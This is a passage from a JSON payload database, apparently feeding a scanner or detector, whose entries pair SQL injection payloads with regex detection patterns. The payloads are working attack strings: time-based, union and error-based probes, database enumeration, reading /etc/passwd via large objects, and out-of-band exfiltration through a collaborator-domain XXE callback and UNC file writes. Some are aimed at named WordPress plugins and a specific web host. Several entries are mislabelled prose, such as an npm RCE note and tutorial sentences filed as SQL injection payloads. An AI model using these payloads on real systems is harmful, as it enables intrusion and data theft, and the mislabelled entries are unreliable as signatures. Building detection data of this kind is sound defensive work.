      "payload": "OR\tOR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "OR\\\tOR\\ 1\\ GROUP\\ BY\\ CONCAT\\('\\~',\\(SELECT\\ version\\(\\)\\),'\\~',FLOOR\\(RAND\\(0\\)\\*2\\)\\)\\ HAVING\\ MIN\\(0\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI OR (SELECT 4396 FROM (SELECT(SLEEP(3)))i [eb862096]",
      "payload": "OR (SELECT 4396 FROM (SELECT(SLEEP(3)))iEbq) AND",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "OR\\ \\(SELECT\\ 4396\\ FROM\\ \\(SELECT\\(SLEEP\\(3\\)\\)\\)iEbq\\)\\ AND",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPT [1c261885]",
      "payload": "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "OR\\ ELT\\(\\[RANDNUM\\]=\\[RANDNUM\\],SLEEP\\(\\[SLEEPTIME\\]\\)\\)",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI OR NOT 1404=1404-- Eotr [8f4e5adc]",
      "payload": "OR NOT 1404=1404-- Eotr",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "OR\\ NOT\\ 1404=1404\\-\\-\\ Eotr",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,1 [9af99025]",
      "payload": "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ORDER\\ BY\\ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100\\-\\-\\+\\ \\#\\ Unknown\\ column\\ '4'\\ in\\ 'order\\ clause'",
      "tags": [
        "order-by"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ORDER BY 1--+ GROUP BY 1--+ True [639b3521]",
      "payload": "ORDER BY 1--+\tGROUP BY 1--+\tTrue",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ORDER\\ BY\\ 1\\-\\-\\+\\\tGROUP\\ BY\\ 1\\-\\-\\+\\\tTrue",
      "tags": [
        "order-by"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ORDER BY 2--+ GROUP BY 2--+ True [6a4ebc33]",
      "payload": "ORDER BY 2--+\tGROUP BY 2--+\tTrue",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ORDER\\ BY\\ 2\\-\\-\\+\\\tGROUP\\ BY\\ 2\\-\\-\\+\\\tTrue",
      "tags": [
        "order-by"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ORDER BY 3--+ GROUP BY 3--+ True [df057b72]",
      "payload": "ORDER BY 3--+\tGROUP BY 3--+\tTrue",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ORDER\\ BY\\ 3\\-\\-\\+\\\tGROUP\\ BY\\ 3\\-\\-\\+\\\tTrue",
      "tags": [
        "order-by"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ORDER BY 4--+ GROUP BY 4--+ False [318c4344]",
      "payload": "ORDER BY 4--+\tGROUP BY 4--+\tFalse",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ORDER\\ BY\\ 4\\-\\-\\+\\\tGROUP\\ BY\\ 4\\-\\-\\+\\\tFalse",
      "tags": [
        "order-by"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Payload: https://template189526.motoprev [73c476da]",
      "payload": "Payload: https://template189526.motopreview.com:443/store/category/search/?keyword=1%' AND 6651=6651 AND 'BvJE%'='BvJE",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Payload:\\ https://template189526\\.motopreview\\.com:443/store/category/search/\\?keyword=1%'\\ AND\\ 6651=6651\\ AND\\ 'BvJE%'='BvJE",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Payload: keyword=1%' AND 3602=3602 AND ' [86a61b79]",
      "payload": "Payload: keyword=1%' AND 3602=3602 AND 'ZnYV%'='ZnYV",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Payload:\\ keyword=1%'\\ AND\\ 3602=3602\\ AND\\ 'ZnYV%'='ZnYV",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Payload: option_page=trp_settings&action [4f643b8e]",
      "payload": "Payload: option_page=trp_settings&action=update&_wpnonce=ca410d0e89&_wp_http_referer=/wp-admin/options-general.php?page=translate-press%26settings-updated=true&trp_settings[default-language]=en_US&trp_settings[publish-languages][]=en_US&trp_settings[translation-languages][]=en_US&trp_settings[translation-languages-formality][]=default&trp_settings[url-slugs][en_US]=en_us&trp_settings[translation-languages][]=en_GB WHERE 4372=4372 AND (SELECT 6967 FROM (SELECT(SLEEP(5)))ZDtR)-- bsZU&trp_settings[publish-languages][]=en_GB&trp_settings[translation-languages-formality][]=default&trp_settings[url-slugs][en_GB]=en&trp_settings[native_or_english_name]=english_name&trp_settings[add-subdirectory-to-default-language]=no&trp_settings[force-language-to-custom-links]=yes&trp_settings[shortcode-options]=flags-full-names&trp_settings[menu-options]=flags-full-names&trp_settings[trp-ls-floater]=yes&trp_settings[floater-options]=flags-full-names&trp_settings[floater-color]=dark&trp_settings[floater-position]=bottom-right&trp_email_course_email=",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Payload:\\ option_page=trp_settings\\&action=update\\&_wpnonce=ca410d0e89\\&_wp_http_referer=/wp\\-admin/options\\-general\\.php\\?page=translate\\-press%26settings\\-updated=true\\&trp_settings\\[default\\-language\\]=en_US\\&trp_settings\\[publish\\-languages\\]\\[\\]=en_US\\&trp_settings\\[translation\\-languages\\]\\[\\]=en_US\\&trp_settings\\[translation\\-languages\\-formality\\]\\[\\]=default\\&trp_settings\\[url\\-slugs\\]\\[en_US\\]=en_us\\&trp_settings\\[translation\\-languages\\]\\[\\]=en_GB\\ WHERE\\ 4372=4372\\ AND\\ \\(SELECT\\ 6967\\ FROM\\ \\(SELECT\\(SLEEP\\(5\\)\\)\\)ZDtR\\)\\-\\-\\ bsZU\\&trp_settings\\[publish\\-languages\\]\\[\\]=en_GB\\&trp_settings\\[translation\\-languages\\-formality\\]\\[\\]=default\\&trp_settings\\[url\\-slugs\\]\\[en_GB\\]=en\\&trp_settings\\[native_or_english_name\\]=english_name\\&trp_settings\\[add\\-subdirectory\\-to\\-default\\-language\\]=no\\&trp_settings\\[force\\-language\\-to\\-custom\\-links\\]=yes\\&trp_settings\\[shortcode\\-options\\]=flags\\-full\\-names\\&trp_settings\\[menu\\-options\\]=flags\\-full\\-names\\&trp_settings\\[trp\\-ls\\-floater\\]=yes\\&trp_settings\\[floater\\-options\\]=flags\\-full\\-names\\&trp_settings\\[floater\\-color\\]=dark\\&trp_settings\\[floater\\-position\\]=bottom\\-right\\&trp_email_course_email=",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Payload: page=nex-forms-dashboard&form_i [7b463971]",
      "payload": "Payload: page=nex-forms-dashboard&form_id=1 AND (SELECT 4715 FROM (SELECT(SLEEP(5)))nPUi)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Payload:\\ page=nex\\-forms\\-dashboard\\&form_id=1\\ AND\\ \\(SELECT\\ 4715\\ FROM\\ \\(SELECT\\(SLEEP\\(5\\)\\)\\)nPUi\\)",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Payload: page=services/view&id=1' AND (S [4284a4b3]",
      "payload": "Payload: page=services/view&id=1' AND (SELECT 1072 FROM",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Payload:\\ page=services/view\\&id=1'\\ AND\\ \\(SELECT\\ 1072\\ FROM",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Payload: page=services/view&id=1' AND (S [35b3d548]",
      "payload": "Payload: page=services/view&id=1' AND (SELECT 1839 FROM(SELECT",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Payload:\\ page=services/view\\&id=1'\\ AND\\ \\(SELECT\\ 1839\\ FROM\\(SELECT",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Payload: page=services/view&id=1' AND 84 [aff8ad07]",
      "payload": "Payload: page=services/view&id=1' AND 8462=8462 AND 'jgHw'='jgHw",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Payload:\\ page=services/view\\&id=1'\\ AND\\ 8462=8462\\ AND\\ 'jgHw'='jgHw",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ProductID=1');waitfor delay '0:0:10'-- [efe098ce]",
      "payload": "ProductID=1');waitfor delay '0:0:10'--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ProductID=1'\\);waitfor\\ delay\\ '0:0:10'\\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ProductID=1';waitfor delay '0:0:10'-- [543d972c]",
      "payload": "ProductID=1';waitfor delay '0:0:10'--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ProductID=1';waitfor\\ delay\\ '0:0:10'\\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ProductID=1));waitfor delay '0:0:10'-- [5352fe76]",
      "payload": "ProductID=1));waitfor delay '0:0:10'--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ProductID=1\\)\\);waitfor\\ delay\\ '0:0:10'\\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ProductID=1);waitfor delay '0:0:10'-- [1908fedc]",
      "payload": "ProductID=1);waitfor delay '0:0:10'--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ProductID=1\\);waitfor\\ delay\\ '0:0:10'\\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ProductID=1;waitfor delay '0:0:10'-- [77093f16]",
      "payload": "ProductID=1;waitfor delay '0:0:10'--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "ProductID=1;waitfor\\ delay\\ '0:0:10'\\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI RCE via npm misconfig -- installing inte [836ff49c]",
      "payload": "RCE via npm misconfig -- installing internal libraries from the public registry",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "RCE\\ via\\ npm\\ misconfig\\ \\-\\-\\ installing\\ internal\\ libraries\\ from\\ the\\ public\\ registry",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI RLIKE SLEEP([SLEEPTIME]) [1e493b80]",
      "payload": "RLIKE SLEEP([SLEEPTIME])",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "RLIKE\\ SLEEP\\(\\[SLEEPTIME\\]\\)",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Retrieve all table-level privileges for  [105e9a36]",
      "payload": "Retrieve all table-level privileges for the current user, excluding tables in system schemas like pg_catalog and information_schema.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Retrieve\\ all\\ table\\-level\\ privileges\\ for\\ the\\ current\\ user,\\ excluding\\ tables\\ in\\ system\\ schemas\\ like\\ pg_catalog\\ and\\ information_schema\\.",
      "tags": [
        "enumeration",
        "postgres"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT * FROM INFORMATION_SCHEMA.PROCESS [eb9936a7]",
      "payload": "SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ \\*\\ FROM\\ INFORMATION_SCHEMA\\.PROCESSLIST;",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT * FROM information_schema.role_ta [e1c63cc3]",
      "payload": "SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ \\*\\ FROM\\ information_schema\\.role_table_grants\\ WHERE\\ grantee\\ =\\ current_user\\ AND\\ table_schema\\ NOT\\ IN\\ \\('pg_catalog',\\ 'information_schema'\\);",
      "tags": [
        "enumeration",
        "postgres"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT * FROM users WHERE user = 'admin' [6170b3ae]",
      "payload": "SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ \\*\\ FROM\\ users\\ WHERE\\ user\\ =\\ 'admin'/\\*'\\ AND\\ pass\\ =\\ '\\*/and\\ pass>''\\ ALLOW\\ FILTERING;",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT * from pg_largeobject; -- or just [d9721bd4]",
      "payload": "SELECT * from pg_largeobject; -- or just get all the large objects and their data",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ \\*\\ from\\ pg_largeobject;\\ \\-\\-\\ or\\ just\\ get\\ all\\ the\\ large\\ objects\\ and\\ their\\ data",
      "tags": [
        "postgres"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT @@version INTO DUMPFILE '\\\\\\\\192. [d2d79657]",
      "payload": "SELECT @@version INTO DUMPFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt;",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ @@version\\ INTO\\ DUMPFILE\\ '\\\\\\\\\\\\\\\\192\\.168\\.0\\.100\\\\\\\\temp\\\\\\\\out\\.txt;",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT @@version INTO OUTFILE '\\\\\\\\192.1 [edbd61d6]",
      "payload": "SELECT @@version INTO OUTFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ @@version\\ INTO\\ OUTFILE\\ '\\\\\\\\\\\\\\\\192\\.168\\.0\\.100\\\\\\\\temp\\\\\\\\out\\.txt';",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT @@version WHERE @@version LIKE '% [e8866750]",
      "payload": "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ @@version\\ WHERE\\ @@version\\ LIKE\\ '%12\\.0\\.2000\\.8%'",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT COLUMN_NAME,DATA_TYPE FROM SYS.AL [a646f6f4]",
      "payload": "SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ COLUMN_NAME,DATA_TYPE\\ FROM\\ SYS\\.ALL_TAB_COLUMNS\\ WHERE\\ TABLE_NAME='<TABLE_NAME>'\\ AND\\ OWNER='<DBNAME>'",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT EXTRACTVALUE(xmltype('<?xml versi [29e16a4c]",
      "payload": "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ EXTRACTVALUE\\(xmltype\\('<\\?xml\\ version=\"1\\.0\"\\ encoding=\"UTF\\-8\"\\?><!DOCTYPE\\ root\\ \\[\\ <!ENTITY\\ %\\ remote\\ SYSTEM\\ \"http://'\\|\\|\\(SELECT\\ YOUR\\-QUERY\\-HERE\\)\\|\\|'\\.BURP\\-COLLABORATOR\\-SUBDOMAIN/\">\\ %remote;\\]>'\\),'/l'\\)\\ FROM\\ dual",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNIO [ba30660d]",
      "payload": "SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ `4`\\ FROM\\ \\(SELECT\\ 1,2,3,4,5,6\\ UNION\\ SELECT\\ \\*\\ FROM\\ USERS\\)DBNAME;",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT database_to_xml(true,true,''); -- [bf8c6638]",
      "payload": "SELECT database_to_xml(true,true,''); -- dump the current database to XML",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ database_to_xml\\(true,true,''\\);\\ \\-\\-\\ dump\\ the\\ current\\ database\\ to\\ XML",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT database_to_xmlschema(true,true,' [c75ba010]",
      "payload": "SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ database_to_xmlschema\\(true,true,''\\);\\ \\-\\-\\ dump\\ the\\ current\\ db\\ to\\ an\\ XML\\ schema",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT json_arrayagg(concat_ws(0x3a,tabl [04fecd63]",
      "payload": "SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ json_arrayagg\\(concat_ws\\(0x3a,table_schema,table_name\\)\\)\\ from\\ INFORMATION_SCHEMA\\.TABLES;",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT lo_export(43210, '/tmp/testexport [81c9febf]",
      "payload": "SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ lo_export\\(43210,\\ '/tmp/testexport'\\);\\ \\-\\-\\ export\\ data\\ to\\ /tmp/testexport",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT lo_from_bytea(43210, 'your file d [c114f799]",
      "payload": "SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ lo_from_bytea\\(43210,\\ 'your\\ file\\ data\\ goes\\ in\\ here'\\);\\ \\-\\-\\ create\\ a\\ large\\ object\\ with\\ OID\\ 43210\\ and\\ some\\ data",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT lo_get(16420); -- use the OID ret [9593e0d1]",
      "payload": "SELECT lo_get(16420); -- use the OID returned from the above",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ lo_get\\(16420\\);\\ \\-\\-\\ use\\ the\\ OID\\ returned\\ from\\ the\\ above",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT lo_import('/etc/passwd'); -- will [5479a92c]",
      "payload": "SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ lo_import\\('/etc/passwd'\\);\\ \\-\\-\\ will\\ create\\ a\\ large\\ object\\ from\\ the\\ file\\ and\\ return\\ the\\ OID",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT lo_put(43210, 20, 'some other dat [f6af7a8d]",
      "payload": "SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ lo_put\\(43210,\\ 20,\\ 'some\\ other\\ data'\\);\\ \\-\\-\\ append\\ data\\ to\\ a\\ large\\ object\\ at\\ offset\\ 20",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT query_to_xml('select * from pg_us [6d3f4429]",
      "payload": "SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ query_to_xml\\('select\\ \\*\\ from\\ pg_user',true,true,''\\);\\ \\-\\-\\ returns\\ all\\ the\\ results\\ as\\ a\\ single\\ xml\\ row",
      "tags": [
        "postgres"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT schema_name FROM INFORMATION_SCHE [ae87d6c1]",
      "payload": "SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA\tGathering all dataset names",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ schema_name\\ FROM\\ INFORMATION_SCHEMA\\.SCHEMATA\\\tGathering\\ all\\ dataset\\ names",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT table_catalog, column_name FROM i [a78d7219]",
      "payload": "SELECT table_catalog, column_name FROM information_schema.columns",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ table_catalog,\\ column_name\\ FROM\\ information_schema\\.columns",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT table_catalog, table_name FROM in [7c33bfd0]",
      "payload": "SELECT table_catalog, table_name FROM information_schema.columns",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ table_catalog,\\ table_name\\ FROM\\ information_schema\\.columns",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT table_name FROM information_schem [0ef23005]",
      "payload": "SELECT table_name FROM information_schema .tables",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ table_name\\ FROM\\ information_schema\\ \\.tables",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT table_name FROM information_schem [5826ee10]",
      "payload": "SELECT table_name FROM information_schema 1.e.tables",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ table_name\\ FROM\\ information_schema\\ 1\\.e\\.tables",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI SELECT table_name FROM information_schem [e5c559a4]",
      "payload": "SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "SELECT\\ table_name\\ FROM\\ information_schema\\.tables\\ WHERE\\ table_catalog='<DBNAME>'",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Simple Task Managing System 1.0 allows S [d763f2ba]",
      "payload": "Simple Task Managing System 1.0 allows SQL Injection via parameters 'login' and 'password' in /TaskManagingSystem/login.php",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Simple\\ Task\\ Managing\\ System\\ 1\\.0\\ allows\\ SQL\\ Injection\\ via\\ parameters\\ 'login'\\ and\\ 'password'\\ in\\ /TaskManagingSystem/login\\.php",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Since the result doesn't show any error  [97a4795c]",
      "payload": "Since the result doesn't show any error it means the query uses 3 columns: -1' UNION SELECT 1,2,3--+.",
